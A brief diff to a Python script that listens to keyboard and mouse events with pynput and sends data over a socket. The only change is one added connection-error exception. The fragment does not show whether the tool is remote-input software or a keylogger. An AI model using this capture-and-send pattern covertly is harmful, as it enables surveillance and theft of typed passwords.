@@ -5,7 +5,7 @@ from pynput import keyboard, mouse
 def send_data(data):
     try:
         client_socket.sendall(data.encode())
-    except (BrokenPipeError, ConnectionResetError):
+    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
         print("Connection lost. Stopping...")
         keyboard_listener.stop()
         mouse_listener.stop()
